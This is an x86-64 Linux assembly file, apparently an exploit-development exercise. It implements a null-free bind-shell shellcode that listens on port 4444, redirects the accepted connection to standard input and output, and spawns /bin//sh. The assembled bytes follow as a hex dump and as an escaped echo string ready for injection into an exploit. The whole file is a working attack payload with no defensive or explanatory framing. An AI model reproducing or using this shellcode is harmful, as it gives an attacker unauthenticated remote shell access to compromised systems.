global _start

BITS 64

_start:
    xor rax, rax ; padding in rax
    push rax
    mov rax, 0xFFFFFFFFA3EEFFFE ; inverse value of 0.0.0.0 4444
    neg rax
    push rax

socket:
    xor rax, rax
    mov al, 0x29
    xor rdi, rdi
    mov dil, 2
    xor rsi, rsi
    mov sil, 1 ; sock stream
    xor rdx, rdx
    syscall

bind:
    mov rdi, rax ; sock fd in rdi
    xor rax, rax
    mov al, 0x31
    lea rsi, [rsp] ; pointer to our address in the stack
    mov dl, 0x10 ; size of the struct (16)
    syscall

listen:
    xor rax, rax
    mov al, 0x32
    ; rdi is still the sockfd
    xor rsi, rsi
    mov sil, 1 ; waiting queue
    syscall

accept:
    xor rax, rax
    mov al, 0x2b
    ; rdi is still the sockfd
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov r10, rax ; save the new fd in r10 to not use the stack

dup2first:
    mov rdi, r10 ; oldfd = acceptfd
    xor rsi, rsi ; (newfd = STDIN)
    xor rax, rax
    mov al, 33
    syscall

dup2sec:
    mov rdi, r10
    xor rsi, rsi
    mov sil, 1 ; (newfd = STDOUT)
    xor rax, rax
    mov al, 33
    syscall

dup2third:
    mov rdi, r10
    xor rsi, rsi
    mov sil, 2 ; (newfd = STDERR)
    xor rax, rax
    mov al, 33
    syscall

execve:
    xor rax, rax
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall


; 4831c05048c7c0feffeea348f7d8504831c0b0294831ff40b7024831f640
; b6014831d20f054889c74831c0b031488d3424b2100f054831c0b0324831
; f640b6010f054831c0b02b4831f64831d20f054989c24c89d74831f64831
; c0b0210f054c89d74831f640b6014831c0b0210f054c89d74831f640b602
; 4831c0b0210f054831c05048bf2f62696e2f2f7368574889e74831f64831
; d24831c0b03b0f05

; echo -ne "\x48\x31\xc0\x50\x48\xc7\xc0\xfe\xff\xee\xa3\x48\xf7\xd8\x50\x48\x31\xc0\xb0\x29\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x31\x48\x8d\x34\x24\xb2\x10\x0f\x05\x48\x31\xc0\xb0\x32\x48\x31\xf6\x40\xb6\x01\x0f\x05\x48\x31\xc0\xb0\x2b\x48\x31\xf6\x48\x31\xd2\x0f\x05\x49\x89\xc2\x4c\x89\xd7\x48\x31\xf6\x48\x31\xc0\xb0\x21\x0f\x05\x4c\x89\xd7\x48\x31\xf6\x40\xb6\x01\x48\x31\xc0\xb0\x21\x0f\x05\x4c\x89\xd7\x48\x31\xf6\x40\xb6\x02\x48\x31\xc0\xb0\x21\x0f\x05\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
